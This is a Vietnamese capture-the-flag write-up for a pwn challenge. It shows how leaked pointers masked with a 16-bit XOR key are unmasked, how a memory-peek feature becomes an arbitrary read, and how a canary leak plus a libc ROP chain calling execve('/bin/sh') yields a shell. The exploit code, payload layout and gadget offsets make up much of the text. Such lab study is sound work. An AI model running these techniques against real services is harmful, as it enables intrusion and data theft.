# PWN#005 — leak XOR 16-bit thành arbitrary read rồi lấy shell

**Flag:** CTF{19a2c93af520a379ebc2b3f4528b103a} · **Files:** challenge không cung cấp artifact; document_store.memdump (40 991 B, SHA-256 a7996c9bab738eb97f538d2f9e49cb721e8da59f23c156543c59f249cefcf955) là memory dump **được lấy qua chính bug** · **Target:** 169.58.126.107:5008

## Đề bài

Thẻ ghi PWN#005, mục tiêu “lấy shell trên host từ xa và đọc flag”, service ở 169.58.126.107 5008, format CTF{}. Khác [PWN#001](PWN001.md) và [PWN#002](PWN002.md), challenge **không cung cấp binary, libc hay loader** — chỉ có TCP port. Vì vậy, quá trình giải chạy song song hai hướng: đo hành vi black-box và dựng primitive đọc memory để tự trích xuất artifact.

Service:

```text
=== Document Store ===
1) Peek memory  2) Checkout
>
```

Ngoài hai lựa chọn nhìn thấy được còn có **hai lựa chọn ẩn, 7 và 9**, đều in session: 0x%016lx 0x%016lx. Menu parse input bằng strtol(buf, NULL, 0), nên 7, 07, 0x7, +7 và  7 đều tới option 7 (09 không hợp lệ vì được hiểu là octal). Mỗi kết nối chạy process mới: PIE base, stack và canary đều thay đổi.

## Phân tích

### 1. Checkout là stack overflow có canary

Option 2 in Leave a note before you go: rồi đọc vào stack buffer. Đo giới hạn bằng cách gửi payload tăng dần và theo dõi process:

| Độ dài payload | Kết quả |
|---|---|
| 1..72 | quay lại menu |
| 73 | chỉ quay lại menu **nếu** byte 72 là 0x00 (30/30 lần) |
| 74 trở lên | **luôn** chết, bất kể giá trị byte 73 |

Byte 72 cần là 0x00; byte 73 ngẫu nhiên theo từng kết nối — đúng dạng **stack canary** (fs:0x28, least significant byte luôn 0x00). Hai phép kiểm tra nữa loại giả thuyết “offset 72 là return address”:

- 3072 lần thử với byte 73 ngẫu nhiên → 9 lần sống sót, khoảng 1/256.
- Thử phân tầng theo 4 high nibble × 256 lần → 0/256, 0/256, 2/256, 1/256, các lần trúng phân bố rải rác.

Nếu offset 72 là return address thì PIE base căn chỉnh theo page khiến bits 8..11 cố định, nên một nibble duy nhất phải có khoảng 16/256 lần trúng. Không nibble nào đạt mức đó ⇒ offset 72 là canary. Layout:

```text
note[72]  @ rbp-0x50      (offset 0..71)
canary    @ rbp-0x08      (offset 72..79)
saved rbp @ rbp+0x00      (offset 80..87)
ret addr  @ rbp+0x08      (offset 88..95)
```

Canary mới trên mỗi kết nối (byte từng trúng cũng không trúng lại trong 0/40 lần sau), nên đây không phải fork server và không thể brute-force canary.

### 2. Hai option ẩn in ptr XOR key, key chỉ dài 16 bit

Option 7 và 9 in ra hai pointer đã XOR-mask. Qua 120 kết nối:

- v1(7) ^ v1(9) = 0xb **cố định 120/120 lần** ⇒ hai pointer cách nhau 11 byte và dùng chung key.
- v_a ^ v_b thay đổi nhưng **chỉ ở bits 12..19**, đúng dạng (x) ^ (x+3) do carry chain của PIE base căn theo page ⇒ ba pointer nằm ở offset cố định trong image.
- v_d là stack address (0x7ffc...).
- Burst 8 kết nối trong một giây cho 8 key khác nhau; bit 63 của key thay đổi ⇒ key không phải hai giá trị rand() 31-bit ghép lại. Brute-force PID-seeded PRNG (300k seed × 5 biến thể) không tìm ra gì; mô hình Z3 **không xác định duy nhất** (có nhiều nghiệm).

Nhưng key không phải số ngẫu nhiên 64-bit. Nó chỉ là **hai byte** từ getrandom(buf, 2, 0), XOR **từng byte** vào pointer:

```text
PIE+0x453  getrandom(buf, 2, 0)                            ; two random bytes
PIE+0x479  mov word ptr [rip+0x2bba], ax                    ; 16-bit key at PIE+0x303a
PIE+0x0aa  mask helper:
  PIE+0xcd   movzx eax, word [rip+0x2f66]                   ; key
  PIE+0xd4   mov [rbp-0x1e], al                             ; key_lo
  PIE+0xe2   mov [rbp-0x1d], al                             ; key_hi
  PIE+0xf3   movzx eax, byte [rbp+rax-0x10]                 ; ptr[i]
  PIE+0x101  and eax, 1                                     ; i & 1
  PIE+0x10e  xor eax, edx
  PIE+0x117  mov [rbp+rax-0x10], dl                         ; ptr[i] ^= key[i & 1]
```

Vì **mọi user-space pointer đều có byte 6 và 7 bằng 0**, 16 bit cao nhất của giá trị đã leak chính là key. Chỉ cần:

```python
h   = leaked >> 48
key = h | (h << 16) | (h << 32) | (h << 48)   # two bytes repeated
ptr = leaked ^ key
```

Unmask cho bốn giá trị ổn định qua 6/6 kết nối (leak-samples.txt):

| Giá trị | Ý nghĩa |
|---|---|
| p_a | PIE + 0x4e6 — return address trong main (sau call session7) |
| p_b | PIE + 0x3018 — data pointer |
| p_c | PIE + 0x4ed — return address trong main (sau call session9) |
| p_d | 0x7ffc... — stack address, rbp **dùng chung bởi mọi callee của main** |

p_a ^ p_c = 0xb và p_a ^ p_b = 0x?4fe khớp các offset cố định so với page-aligned base như dự đoán ở mục 2.

### 3. Peek memory là arbitrary read thật

Option 1 hỏi Address và Length; cả hai được helper tại PIE+0x147 đọc (printf(prompt), read(0, buf, 0x1f), strtol(buf, NULL, 0)), sau đó:

```text
PIE+0x1f9  cmp qword [rbp-0x10], 0
PIE+0x224  jle  invalid            ; len <= 0
PIE+0x226  cmp qword [rbp-0x10], 0x400
PIE+0x22e  jle  do_peek            ; len <= 1024
PIE+0x241  mov rdx, [rbp-0x10]     ; len
PIE+0x245  mov rax, [rbp-0x18]     ; addr
PIE+0x24c  mov edi, 1
PIE+0x251  call write@plt          ; write(1, addr, len)
PIE+0x256  ...                     ; write(1, "\n", 1)
```

Địa chỉ sai làm write trả EFAULT nhưng **không crash** — vì thế lượt phân tích đầu tưởng function này “im lặng với mọi địa chỉ”. Đọc tại p_a & ~0xfff trả \x7fELF:

```text
peek(PIE+0x000, 4) -> 7f 45 4c 46        # PIE base = p_a & ~0xfff
```

Từ đó dump được toàn bộ mapping ([PIE-0x5000, PIE+0x501F], 40 991 byte) thành document_store.memdump. Tác giả **NOP 0x40 byte ELF header** (byte 0..3 là \x7fELF, phần còn lại là 0x90), nên readelf/objdump không parse được image; disassembly.txt đọc trực tiếp theo offset đã biết.

### 4. Flag nằm trong environment

entrypoint.sh export flag, nên FLAG=CTF{...} nằm trên initial stack phía trên các frame. Dùng arbitrary read quét lên trên từ p_d:

```text
@p_d+0xc85  b'/challenge\x00FLAG=CTF{19a2c93af520a379ebc2b3f4528b103a}\x00SOCAT_PID=...'
```

Đây là đường ngắn nhất: **unmask leak → lấy stack address → peek environment → lấy flag**. Không cần overflow hay shell.

## Các thử nghiệm thất bại

Log đầy đủ trong notes.md; dưới đây là các hướng đã thử cùng bằng chứng loại bỏ:

1. **Coi Peek memory là stub** rồi scan địa chỉ cố định (0, 0x400000, 0x7ffffffde000, 0xffffffffff600000, toàn stack window 0x7ffffffff000 - i*0x1000, khoảng 3000 probe) → luôn im lặng. Nguyên nhân là EFAULT, không phải stub; chỉ nhận ra sau khi có địa chỉ hợp lệ (mục 3).
2. **Coi offset 72 là return address** (không có canary), thử partial overwrite 2 byte quanh return site (khoảng 5000 probe). Payload từ 74 byte trở lên đều bị __stack_chk_fail chặn trước ret; “trúng” là do ngẫu nhiên đúng canary byte (1/256). Test 4 nibble × 256 lần cho thấy hit rải rác, không nibble nào gần 16/256 (canary-bypass.log cũng có control: canary sai → EOF).
3. **Giải mask bằng đại số hoặc brute force:** mô hình ptr ^ key với key ngẫu nhiên 64-bit thiếu ràng buộc (Z3 trả nhiều nghiệm); dò PID seed không ra; burst cùng giây vẫn có key khác. Không đúng — key chỉ dài 16 bit và áp dụng theo byte, không phải key ngẫu nhiên 64-bit.
4. **Dùng gadget trong binary:** chỉ có leave; ret và ret — không có pop rdi, pop rsi, pop rax hay syscall (đã scan byte pattern trên document_store.memdump). Cần gadget libc.
5. **Tìm libc base:** challenge không cung cấp libc. Thay vào đó, arbitrary read lấy libc code pointer P từ p_d+0x38 rồi scan byte pattern quanh P để tìm gadget. Offset tương đối với P không đổi vì cả hai đều nằm trong libc; không cần biết base hay phiên bản libc chính xác.
6. **Cần pop rdx; ret** để đặt envp = NULL khi gọi execve: không thấy trong cửa sổ ±0x20000. Chain vẫn chạy vì execve với giá trị rdx còn lại từ printf không fault trên build này (shell-output.txt), nên không cần gadget đó.

## Lời giải

getflag.py có cả hai đường: mở shell (đúng theo mục tiêu “get a shell”) và đọc environment (fallback, cũng là đường ngắn nhất).

**Bước 1 — Bỏ mask khỏi leak.** Gửi 7 rồi 9, đọc bốn giá trị, lấy key từ 16 bit trên cùng rồi XOR:

```python
h   = a >> 48
key = h | (h << 16) | (h << 32) | (h << 48)
pa, pb, pc, pd = a ^ key, b ^ key, c ^ key, d ^ key
base = pa & ~0xfff                       # PIE base
assert v.peek(base, 4) == b"\x7fELF"     # base confirmed
```

**Bước 2 — Đọc canary và libc pointer.** p_d là rbp dùng chung, nên canary ở p_d-8:

```python
canary   = u64(v.peek(pd - 8, 8))        # e.g. 0x0d10d1568bde9000, low byte 0x00
orig_rbp = u64(v.peek(pd, 8))
```

Libc pointer P nằm tại [p_d+0x38] (giá trị 0x7f..., không page-aligned và cách xa p_d).

**Bước 3 — Chain execve("/bin/sh").** Buffer ở p_d-0x50, return address ở p_d+8, còn read tối đa 0x100 byte nên chain phải gọn (168 byte):

```python
binsh = pd - 0x50 + 160                  # "/bin/sh" placed inside the buffer
chain = b"".join(p64(x) for x in (
    P + 0xA42,   binsh,        # pop rdi; ret  -> &"/bin/sh"
    P - 0x14C,   0,            # pop rsi; ret  -> NULL
    P + 0x1A411, 59,           # pop rax; ret  -> SYS_execve
    P + 0x22,                  # syscall
))
payload = b"A"*72 + p64(canary) + p64(orig_rbp) + chain
payload = payload.ljust(160, b"\x00") + b"/bin/sh\x00"
```

Offset gadget (tính tương đối với P, tìm bằng byte-pattern scan qua arbitrary read — gadget-scan.log):

```text
pop rdi; ret  = P + 0xa42
pop rsi; ret  = P - 0x14c
pop rax; ret  = P + 0x1a411
syscall       = P + 0x22
```

Binary **không có seccomp** (imports chỉ gồm setvbuf, strtol, printf, write, getrandom, exit, __stack_chk_fail, __libc_start_main, __cxa_finalize), nên execve thành công và shell hoạt động thật.

**Bước 4 — Đọc flag.** Sau execve, socket trở thành stdin/stdout của /bin/sh:

```text
echo SHELL_OK; id; cat /flag/flag.txt
```

**Fallback (cũng là đường ngắn nhất).** Nếu chain lỗi, chỉ cần Bước 1 rồi scan environment:

```python
addr = (pd + 0x200) & ~0x3ff
while addr < pd + 0x20000:
    chunk = v.peek(addr, 1024)
    if b"FLAG=" in chunk: ...        # FLAG=CTF{...}
    addr += 1024
```

## Tái hiện

Cần service tại 169.58.126.107:5008 còn sống và Python 3 (chỉ dùng thư viện chuẩn). Không cần binary, libc hay loader — document_store.memdump chỉ để đọc lại disassembly.

```bash
cd pwn005
python getflag.py
```

Script chạy ba lượt trên **một** kết nối: leak option 7/9 → unmask → peek base, canary và P → gửi payload 168 byte → cat /flag/flag.txt. Nếu service đã tắt thì không thể chạy lại; các giá trị trên lấy từ log đã lưu.
